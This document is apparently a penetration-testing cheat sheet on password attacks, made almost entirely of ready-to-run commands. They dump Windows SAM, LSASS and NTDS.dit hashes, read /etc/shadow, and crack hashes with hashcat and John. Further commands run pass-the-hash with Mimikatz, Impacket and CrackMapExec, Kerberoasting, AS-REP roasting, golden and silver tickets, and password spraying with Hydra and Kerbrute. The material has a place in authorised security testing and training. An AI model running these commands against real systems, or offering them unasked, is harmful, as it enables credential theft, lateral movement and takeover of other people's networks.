# Password Attacks

## Password Attacks

Password attacks are techniques used to obtain, crack, or bypass authentication credentials. These methods are crucial for security assessments, penetration testing, and understanding defensive measures against unauthorized access.

### Credential Hunting

#### Windows Credential Locations

| Location                 | Description                                                | Access Method                                     |
| ------------------------ | ---------------------------------------------------------- | ------------------------------------------------- |
| SAM Database             | Stores local account hashes                                | `reg save HKLM\SAM sam.save`                      |
| LSASS Process            | Contains in-memory credentials                             | Process dumping tools                             |
| NTDS.dit                 | Domain controller database with all domain password hashes | Volume Shadow Copy or Directory Service utilities |
| Credential Manager       | Saved web/Windows credentials                              | `cmdkey /list`                                    |
| Registry Credentials     | AutoLogon, stored credentials                              | `reg query HKLM /f password /t REG_SZ /s`         |
| Configuration Files      | Application config files                                   | Search for password patterns                      |
| Group Policy Preferences | Potential domain credentials                               | `findstr /S /I cpassword \\\\sysvol\\*.xml`       |

#### Linux Credential Locations

| Location            | Description                             | Access Method                      |
| ------------------- | --------------------------------------- | ---------------------------------- |
| /etc/shadow         | Hashed user passwords                   | `cat /etc/shadow`                  |
| .bash\_history      | Command history may contain credentials | `cat ~/.bash_history`              |
| SSH Keys            | Private/public key pairs                | `ls -la ~/.ssh/`                   |
| Configuration Files | App configs in /etc or home directories | `grep -r "password" /etc/`         |
| Browser Data        | Saved browser credentials               | Access `~/.mozilla/` or similar    |
| Cleartext Files     | Notes, backup files with credentials    | `find / -name "*.txt" 2>/dev/null` |
| Memory Dumps        | Credentials in process memory           | Memory analysis tools              |

### Hash Extraction Techniques

#### Windows SAM Database

```cmd
# Save SAM and SYSTEM registry hives
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Extract with Impacket
python secretsdump.py -sam sam.save -system system.save LOCAL
```

#### LSASS Memory Dumping

```powershell
# Create process dump with Task Manager
# Process Explorer
# Process Hacker

# Using ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# Using Mimikatz to extract from dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### NTDS.dit from Domain Controllers

```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save

# Extract with Impacket
python secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

#### Linux /etc/shadow

```bash
# Copy shadow file
cat /etc/shadow

# Unshadow (combine with passwd for John)
unshadow /etc/passwd /etc/shadow > hashes.txt
```

### Password Cracking

#### Hashcat

```bash
# MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# SHA-512 (Linux $6$)
hashcat -m 1800 -a 0 hashes.txt wordlist.txt

# NetNTLMv2
hashcat -m 5600 -a 0 hashes.txt wordlist.txt

# With rules
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
```

#### John the Ripper

```bash
# Auto-detect hash type
john --wordlist=wordlist.txt hashes.txt

# Specific format
john --format=nt --wordlist=wordlist.txt hashes.txt

# With rules
john --format=nt --wordlist=wordlist.txt --rules=Jumbo hashes.txt

# Show cracked passwords
john --show --format=nt hashes.txt
```

### Pass-the-Hash Attacks

#### Using Mimikatz (Windows)

```powershell
# Pass-the-Hash with Mimikatz
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:e2b475c11da2a0748290d87aa966c327

# PTH to create a new process
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:e2b475c11da2a0748290d87aa966c327 /run:cmd.exe
```

#### Using Impacket (Linux)

```bash
# SMB access with PTH
python psexec.py -hashes :e2b475c11da2a0748290d87aa966c327 administrator@10.10.10.10

# WMI access with PTH
python wmiexec.py -hashes :e2b475c11da2a0748290d87aa966c327 administrator@10.10.10.10
```

#### CrackMapExec for PTH

```bash
# SMB pass-the-hash
crackmapexec smb 10.10.10.10 -u administrator -H e2b475c11da2a0748290d87aa966c327

# Execute commands
crackmapexec smb 10.10.10.10 -u administrator -H e2b475c11da2a0748290d87aa966c327 -x "whoami"
```

### Kerberos Attacks

#### Kerberoasting

```bash
# GetUserSPNs.py from Impacket
python GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# PowerShell Empire/PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
```

#### AS-REP Roasting

```bash
# GetNPUsers.py from Impacket
python GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep.txt

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

#### Golden Ticket Attack

```powershell
# Using Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
```

#### Silver Ticket Attack

```powershell
# Using Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:http /rc4:hash /ptt
```

### Password Spraying

#### Windows Internal Networks

```powershell
# Using DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2023! -OutFile spray_results.txt
```

```bash
# Using CrackMapExec
crackmapexec smb 10.10.10.0/24 -u usernames.txt -p 'Spring2023!' --continue-on-success

# Using Kerbrute
kerbrute passwordspray -d contoso.local --dc 10.10.10.10 users.txt 'Spring2023!'
```

#### Web Applications

```bash
# Using Hydra for HTTP POST form
hydra -L users.txt -p 'Spring2023!' 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
```

### Credential Reuse and Pivoting

#### Testing Credentials Across Network

```bash
# SMB login attempts
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123'

# RDP login attempts
crackmapexec rdp 10.10.10.0/24 -u administrator -p 'Password123'

# SSH login attempts
crackmapexec ssh 10.10.10.0/24 -u administrator -p 'Password123'
```
